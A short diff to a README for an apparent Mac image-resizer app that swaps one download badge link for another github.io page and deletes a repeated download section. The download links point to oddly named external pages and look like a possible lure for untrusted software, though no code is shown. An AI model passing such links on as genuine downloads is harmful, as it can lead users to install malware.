@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Get Image Resizer Mac](https://img.shields.io/badge/Get_Image_Resizer_for_Mac-blue?style=for-the-badge&logo=apple)](hhttps://jumakas-olftol-mang.github.io/.github/imageresizer)
+[![Get Image Resizer Mac](https://img.shields.io/badge/Get_Image_Resizer_for_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/imageresizer)
 
 </div>
 
@@ -67,16 +67,6 @@ This makes it an essential utility for photographers, web designers, students, a
 ---
 
 ![Mac Resize Preview](https://cdn.osxdaily.com/wp-content/uploads/2016/09/howto-resize-picture-on-mac-preview-4.jpg)  
-
----
-
-## Get Image Resizer for Mac  
-
-<div align="center">
-
-[![Get Image Resizer Mac](https://img.shields.io/badge/Get_Image_Resizer_for_Mac-blue?style=for-the-badge&logo=apple)](hhttps://jumakas-olftol-mang.github.io/.github/imageresizer)
-
-</div>
 
 ---
 
